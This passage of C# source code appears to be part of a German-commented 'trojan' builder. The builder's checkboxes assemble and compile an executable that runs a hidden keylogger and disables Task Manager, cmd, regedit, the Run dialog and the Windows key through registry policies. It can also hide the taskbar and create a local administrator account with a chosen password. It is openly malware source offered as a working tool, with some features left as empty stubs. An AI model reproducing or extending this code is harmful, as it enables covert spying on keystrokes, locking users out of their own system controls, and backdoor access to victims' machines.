            RegistryKey taskManagerKey = Registry.CurrentUser.CreateSubKey(@""Software\Microsoft\Windows\CurrentVersion\Policies\System"");
            taskManagerKey.SetValue(""DisableRegistryTools"", ""1"");
            taskManagerKey.Close();
        }
    }";
            string createUserCode = @"class User
    {
        public static void Create(string username, string password)
        {
            DirectoryEntry AD = new DirectoryEntry(""WinNT://"" + Environment.MachineName + "",computer"");
            DirectoryEntry NewUser = AD.Children.Add(username, ""user"");
            NewUser.Invoke(""SetPassword"", new object[] { password });
            NewUser.Invoke(""Put"", new object[] { ""Description"", ""Test User from .NET"" });
            NewUser.CommitChanges(); // -> Hängt sich hier auf, wenn es den Benutzer schon gibt.
            DirectoryEntry grp;
            grp = AD.Children.Find(""Administratoren"", ""group""); 
            if (grp != null) { grp.Invoke(""Add"", new object[] { NewUser.Path.ToString() }); }
        }
    }";
            string taskbarCode = @"class Taskbar
    {
        [DllImport(""user32.dll"")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, SetWindowPosFlags uFlags);

        [Flags]
        private enum SetWindowPosFlags : uint
        {
            SWP_ASYNCWINDOWPOS = 0x4000,
            SWP_DEFERERASE = 0x2000,
            SWP_DRAWFRAME = 0x0020,
            SWP_FRAMECHANGED = 0x0020,
            SWP_HIDEWINDOW = 0x0080,
            SWP_NOACTIVATE = 0x0010,
            SWP_NOCOPYBITS = 0x0100,
            SWP_NOMOVE = 0x0002,
            SWP_NOOWNERZORDER = 0x0200,
            SWP_NOREDRAW = 0x0008,
            SWP_NOREPOSITION = 0x0200,
            SWP_NOSENDCHANGING = 0x0400,
            SWP_NOSIZE = 0x0001,
            SWP_NOZORDER = 0x0004,
            SWP_SHOWWINDOW = 0x0040,
        }

        [DllImport(""user32"", EntryPoint = ""FindWindowA"", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
        private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

        [DllImport(""user32.dll"")]
        private static extern IntPtr FindWindowEx(IntPtr parentHwnd, IntPtr childAfterHwnd, IntPtr className, string windowText);

        [DllImport(""user32.dll"", SetLastError = true)]
        private static extern IntPtr GetWindow(IntPtr hWnd, GetWindowCmd uCmd);

        private enum GetWindowCmd : uint
        {
            GW_HWNDFIRST = 0,
            GW_HWNDLAST = 1,
            GW_HWNDNEXT = 2,
            GW_HWNDPREV = 3,
            GW_OWNER = 4,
            GW_CHILD = 5,
            GW_ENABLEDPOPUP = 6
        }

        /// <summary>
        /// Versteckt die Taskleiste.
        /// </summary>
        public static void Hide()
        {
            IntPtr TaskbarHWnd;
            TaskbarHWnd = FindWindow(""Shell_traywnd"", """");
            SetWindowPos(TaskbarHWnd, IntPtr.Zero, 0, 0, 0, 0, SetWindowPosFlags.SWP_HIDEWINDOW);    
        }

        /// <summary>
        /// Zeigt die Taskleiste.
        /// </summary>
        public static void Show()
        {
            IntPtr TaskbarHWnd;
            TaskbarHWnd = FindWindow(""Shell_traywnd"", """");
            SetWindowPos(TaskbarHWnd, IntPtr.Zero, 0, 0, 0, 0, SetWindowPosFlags.SWP_SHOWWINDOW);
        }
    }";


            bool useSystemDiagnostics = false;
            bool useSystemRuntimeInteropServices = false;
            bool useSystemWindowsForms = false;
            bool useSystemIO = false;
            bool useMicrosoftWin32 = false;
            bool useSystemDrawing = false;
            bool useSystemDrawingImaging = false;
            bool useSystemDirectoryServices = false;

            bool needAdmin = false;

            if (autostartCopyCheckbox.IsChecked == true || cmdCheckbox.IsChecked == true || runCheckbox.IsChecked == true || taskmanagerCheckbox.IsChecked == true || windowskeyCheckbox.IsChecked == true || regeditCheckbox.IsChecked == true || powershellCheckbox.IsChecked == true)
            {
                needAdmin = true;
            }

            // Anmerkung: Muss mit == true abgefragt werden, da Rückgabetyp von IsChecked vom Typ bool? ist
            if (keyloggerCheckbox.IsChecked == true)
            {
                useSystemDiagnostics = true;
                useSystemRuntimeInteropServices = true;
                useSystemWindowsForms = true;
                useSystemIO = true;
            }

            if (hideCheckbox.IsChecked == true)
            {
                useSystemDiagnostics = true;
                useSystemRuntimeInteropServices = true;
                useSystemWindowsForms = true;
                useSystemIO = true;
            }

            if (autostartCheckbox.IsChecked == true)
            {
                useMicrosoftWin32 = true;
                useSystemWindowsForms = true;
                useSystemIO = true;
            }

            if (microphoneCheckbox.IsChecked == true)
            {

            }

            if (screenshotCheckbox.IsChecked == true)
            {
                useSystemRuntimeInteropServices = true;
                useSystemDrawing = true;
                useSystemDrawingImaging = true;
            }

            if (cmdCheckbox.IsChecked == true)
            {
                useMicrosoftWin32 = true;
            }

            if (runCheckbox.IsChecked == true)
            {
                useMicrosoftWin32 = true;
            }

            if (taskmanagerCheckbox.IsChecked == true)
            {
                useMicrosoftWin32 = true;
            }

            if (taskbarCheckbox.IsChecked == true)
            {
                useSystemRuntimeInteropServices = true;
            }

            if (windowskeyCheckbox.IsChecked == true)
            {
                useMicrosoftWin32 = true;
            }

            if (powershellCheckbox.IsChecked == true)
            {
                useSystemDiagnostics = true;
                useSystemIO = true;
                useMicrosoftWin32 = true;
            }

            if (regeditCheckbox.IsChecked == true)
            {
                useMicrosoftWin32 = true;
            }

            if (createUserCheckbox.IsChecked == true)
            {
                useSystemDirectoryServices = true;
            }

            CSharpCodeProvider provider = new CSharpCodeProvider();
            CompilerParameters parameters = new CompilerParameters();

            parameters.GenerateInMemory = false;
            parameters.GenerateExecutable = true;
            parameters.OutputAssembly = path;

            parameters.ReferencedAssemblies.Add("System.dll");
            parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
            parameters.ReferencedAssemblies.Add("System.Drawing.dll");
            parameters.ReferencedAssemblies.Add("System.DirectoryServices.dll");


            string code = "using System;using System.Threading;using System.Security.Principal;";

            if (useSystemDiagnostics)
                code += "using System.Diagnostics;";
            if (useSystemRuntimeInteropServices)
                code += "using System.Runtime.InteropServices;";
            if (useSystemWindowsForms)
                code += "using System.Windows.Forms;";
            if (useSystemIO)
                code += "using System.IO;";
            if (useMicrosoftWin32)
                code += "using Microsoft.Win32;";
            if (useSystemDrawing)
                code += "using System.Drawing;";
            if (useSystemDrawingImaging)
                code += "using System.Drawing.Imaging;";
            if (useSystemDirectoryServices)
                code += "using System.DirectoryServices;";

            code += "namespace " + nameTextBox.Text + "{";
            code += "class Program{";
            // Funktion, um auf Adminrechte zu prüfen
            code += @"private bool checkAdmin()
        {
                WindowsIdentity identity = WindowsIdentity.GetCurrent();
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                return principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
            ";
            code += "static void Main(){";
            code += "bool isAdmin = checkAdmin();";
            code += "Console.Title = \"" + nameTextBox.Text + "\";";

            // Hier landet Code, welcher in den Trojaner soll.

            if (keyloggerCheckbox.IsChecked == true)
            {
                if (keyloggerLocalCheckbox.IsChecked == true)
                {
                    code += "Thread keylogger = new Thread(() => Keylogger.EnableWithLog(";
                    switch (keyloggerLocalCombobox.SelectedIndex)
                    {
                        case 0:
                            code += "Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)";
                            break;
                        case 1:
                            code += "Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)";
                            break;
                        case 2:
                            code += "Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)";
                            break;
                    }
                    code += "+ \"\\\\log.txt\"));keylogger.Start();";
                }

                if (keyloggerEmailCheckbox.IsChecked == true)
                {

                }
            }

            if (hideCheckbox.IsChecked == true)
            {
                code += @"Keylogger.Hide();";
            }

            if (autostartCheckbox.IsChecked == true)
            {
                code += @"";
            }

            if (screenshotCheckbox.IsChecked == true)
            {
                code += @"";
            }

            if (cmdCheckbox.IsChecked == true)
            {
                code += @"Cmd.Disable();";
            }

            if (runCheckbox.IsChecked == true)
            {
                code += @"Run.Disable();";
            }

            if (taskmanagerCheckbox.IsChecked == true)
            {
                code += @"Taskmanager.Disable();";
            }

            if (taskbarCheckbox.IsChecked == true)
            {
                code += @"Taskbar.Hide();";
            }

            if (windowskeyCheckbox.IsChecked == true)
            {
                code += @"WindowsKey.Disable();";
            }

            if (powershellCheckbox.IsChecked == true)
            {
                code += @"";
            }

            if (regeditCheckbox.IsChecked == true)
            {
                code += @"RegEdit.Disable();";
            }

            if (createUserCheckbox.IsChecked == true)
            {
                code += @"User.Create(""" + createUserUsernameTextbox.Text + @""", """ + createUserPasswortTextbox.Password + @""");";
            }

            code += "}"; // Close void Main
            code += "}"; // Close class Program

            if (keyloggerCheckbox.IsChecked == true || hideCheckbox.IsChecked == true)
            {
                code += keyloggerHideCode;
            }

            if (autostartCheckbox.IsChecked == true)
            {
                code += autostartCode;
            }

            if (screenshotCheckbox.IsChecked == true)
            {
                code += screenshotCode;
            }

            if (cmdCheckbox.IsChecked == true)
            {
                code += cmdCode;
            }

            if (runCheckbox.IsChecked == true)
            {
                code += runCode;
            }

            if (taskmanagerCheckbox.IsChecked == true)
            {
                code += taskmanagerCode;
            }

            if (taskbarCheckbox.IsChecked == true)
            {
                code += taskbarCode;
            }

            if (windowskeyCheckbox.IsChecked == true)
            {
                code += windowskeyCode;
            }

            if (powershellCheckbox.IsChecked == true)
            {
                code += powershellCode;
            }

            if (regeditCheckbox.IsChecked == true)
            {
                code += regeditCode;
            }

            if (createUserCheckbox.IsChecked == true)
            {
                code += createUserCode;
            }

            code += "}"; // Close Namespace

            CompilerResults results = provider.CompileAssemblyFromSource(parameters, code);
            if (results.Errors.HasErrors)
            {
                StringBuilder sb = new StringBuilder();

                foreach (CompilerError error in results.Errors)
                {
                    sb.AppendLine(String.Format("Error ({0}): {1}", error.ErrorNumber, error.ErrorText));
                }

                compileStatus.Text = "Konnte Anwendung nicht erstellen. Es sind " + results.Errors.Count + " Fehler aufgetreten.";
                compileErrorlog.AppendText(sb.ToString());
            }
            else
            {
                compileProgress.Value = 100;
                compileStatus.Text = "Anwendung erstellt: " + results.PathToAssembly;
            }
        }
    }
}
